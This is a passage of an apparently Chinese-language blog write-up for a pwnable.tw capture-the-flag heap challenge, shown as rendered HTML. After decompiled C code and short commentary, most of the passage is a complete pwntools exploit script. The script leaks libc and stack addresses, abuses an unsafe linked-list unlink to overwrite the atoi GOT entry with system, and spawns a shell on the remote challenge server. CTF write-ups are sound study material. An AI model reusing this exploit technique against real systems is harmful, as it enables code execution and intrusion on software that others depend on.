  <span class="token keyword">char</span> nptr<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+26h] [ebp-22h] BYREF</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-Ch]</span>

  v7 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  addr <span class="token operator">=</span> cart_addr<span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Item Number&gt; &quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">my_read</span><span class="token punctuation">(</span>nptr<span class="token punctuation">,</span> <span class="token number">0x15u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment">// 同样是复写</span>
  v3 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> addr <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> v3 <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      fd <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment">// 后面知道如何利用后才知道一种打法</span>
      bk <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> bk <span class="token punctuation">)</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>bk <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> fd<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> fd <span class="token punctuation">)</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>fd <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">=</span> bk<span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Remove %d:%s from your shopping cart.\n&quot;</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token operator">*</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v7<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token operator">++</span>v1<span class="token punctuation">;</span>
    addr <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v7<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br></div></div><p>计算原本<code>atoi($1)</code>参数1对应栈上的偏移然后写入，把<code>atoi</code>改成<code>system</code>函数，最后利用<code>delete()</code>的末尾的<code>leave|ret</code>进行<code>system</code>的执行。</p> <h4 id="exp-8"><a href="#exp-8" class="header-anchor">#</a> exp</h4> <details class="custom-block details"><summary>exp</summary> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#! /usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token comment"># vim:fenc=utf-8</span>
<span class="token comment">#</span>
<span class="token comment"># Distributed under terms of the MIT license.</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> 

pie  <span class="token operator">=</span> <span class="token number">0</span>
arch <span class="token operator">=</span> <span class="token number">32</span>
bps  <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x08048C0B</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;&gt; &quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;Device Number&gt; &quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delt</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;Item Number&gt; &quot;</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">cart</span><span class="token punctuation">(</span>case<span class="token punctuation">)</span><span class="token punctuation">:</span>
    menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;Let me check your cart. ok? (y/n) &gt; &quot;</span><span class="token punctuation">,</span> case<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>case<span class="token punctuation">)</span><span class="token punctuation">:</span>
    menu<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;Let me check your cart. ok? (y/n) &gt; &quot;</span><span class="token punctuation">,</span> case<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    puts_plt <span class="token operator">=</span> <span class="token number">0x08048500</span>
    atoi_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>


    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
    check<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token string">b'yy'</span><span class="token punctuation">,</span>atoi_got<span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    cart<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'27: '</span><span class="token punctuation">)</span>
    libc_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>re<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x2d050</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'addr ------- &gt;'</span> <span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    slog<span class="token punctuation">[</span><span class="token string">'libc_addr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> libc_addr
    system <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    slog<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">=</span> system

    environ <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'environ ----------&gt;'</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token string">b'yy'</span><span class="token punctuation">,</span>environ<span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    cart<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'27: '</span><span class="token punctuation">)</span>
    ebp <span class="token operator">=</span> u32<span class="token punctuation">(</span>re<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x104</span>
    slog<span class="token punctuation">[</span><span class="token string">'ebp'</span><span class="token punctuation">]</span> <span class="token operator">=</span> ebp

    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token string">b'27'</span><span class="token punctuation">,</span>atoi_got<span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ebp<span class="token operator">-</span><span class="token number">0xc</span><span class="token punctuation">,</span>atoi_got<span class="token operator">+</span><span class="token number">0x22</span><span class="token punctuation">)</span>
    delt<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

    sys_code <span class="token operator">=</span> flat<span class="token punctuation">(</span>system<span class="token punctuation">,</span><span class="token string">b&quot;;$0;&quot;</span><span class="token punctuation">)</span>
    gdba<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;&gt; &quot;</span><span class="token punctuation">,</span>sys_code<span class="token punctuation">)</span>

context<span class="token punctuation">.</span>os<span class="token operator">=</span><span class="token string">'linux'</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

slog <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span> <span class="token punctuation">:</span> <span class="token number">111</span><span class="token punctuation">}</span>
local <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">64</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'i386'</span>

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bin'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'chall.pwnable.tw'</span><span class="token punctuation">,</span> <span class="token number">10104</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bin'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">gdba</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> local <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    cmd <span class="token operator">=</span><span class="token string">'set follow-fork-mode parent\n'</span>
    <span class="token comment">#cmd=''</span>
    <span class="token keyword">if</span> pie<span class="token punctuation">:</span>
        base <span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">&quot;pmap {}|grep bin |awk '{{print $1}}'&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
        cmd <span class="token operator">+=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b *{:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>b<span class="token operator">+</span>base<span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> bps<span class="token punctuation">]</span><span class="token punctuation">)</span>
        cmd <span class="token operator">+=</span><span class="token string">'set $base={:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span>
        slog<span class="token punctuation">[</span><span class="token string">'base'</span><span class="token punctuation">]</span> <span class="token operator">=</span> base	
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        cmd<span class="token operator">+=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b *{:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> bps<span class="token punctuation">]</span><span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>cmd<span class="token punctuation">)</span>

re  <span class="token operator">=</span> <span class="token keyword">lambda</span> m<span class="token punctuation">,</span> t <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>m<span class="token punctuation">,</span> timeout<span class="token operator">=</span>t<span class="token punctuation">)</span>
recv<span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
sd  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ia  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
sa  <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
<span class="token comment"># after a, send b;</span>

<span class="token keyword">def</span> <span class="token function">slog_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> slog<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">' ==&gt; '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>slog<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">blast</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>

        exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>
        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

slog_show<span class="token punctuation">(</span><span class="token punctuation">)</span>

ia<span class="token punctuation">(</span><span class="token punctuation">)</span>


</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br></div></div></details> <p>PS:实在是太顶了，学到了hin多，不过懒狗的我，后面几个题的调试图，就不发出来了。后面题目我经量会在做的时候，截下调试图。</p> <p>会持续更新直到我刷到第一页为止吧。</p></div></div> <div class="page-slot page-slot-bottom"><!-- 横向自适应 -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="6620245489"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div> <div class="page-edit"><div class="edit-link"><a href="https://github.com/xugaoyi/vuepress-theme-vdoing/edit/master/docs/00.Pwn/00.带学弟之一起刷tw.md" target="_blank" rel="noopener noreferrer">编辑</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <div class="tags"><a href="/tags/?tag=pwnable" title="标签">#pwnable</a><a href="/tags/?tag=pwn" title="标签">#pwn</a><a href="/tags/?tag=wp" title="标签">#wp</a></div> <!----></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><!----> <a href="/pages/9bb16d/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">armpwn</div></a></div> <div class="page-nav"><p class="inner"><!----> <span class="next"><a href="/pages/9bb16d/">armpwn</a>→
      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/about/d769bc/"><div>about</div></a> <span>04-20</span></dt></dl><dl><dd>02</dd> <dt><a href="/friends/8107b9/"><div>friend</div></a> <span>04-20</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/eb3add/"><div>博客搭建完成啦</div></a> <span>04-19</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div></main></div> <div class="footer"><div class="icons"><a href="mailto:1515240194@qq.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/0xshaobai" title="GitHub" target="_blank" class="iconfont icon-github"></a><a href="https://www.zhihu.com/people/yang-yu-ban-tu-dou-43" title="知乎" target="_blank" class="iconfont icon-zhihu"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2021-2021
    <span>Evan Xu | <a href="https://github.com/xugaoyi/vuepress-theme-vdoing/blob/master/LICENSE" target="_blank">MIT License</a></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <div class="body-bg" style="background:url() center center / cover no-repeat;opacity:0.5;"></div> <!----> <div class="custom-html-window custom-html-window-rb" style="display:;"><div class="custom-wrapper"><i class="close-but">×</i> <div><!-- 固定160*160px -->
      <ins class="adsbygoogle"
          style="display:inline-block;max-width:160px;max-height:160px"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="8377369658"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script>
      </div></div></div></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.9038ce9a.js" defer></script><script src="/assets/js/2.6bd067a5.js" defer></script><script src="/assets/js/5.7d169444.js" defer></script>
  </body>
</html>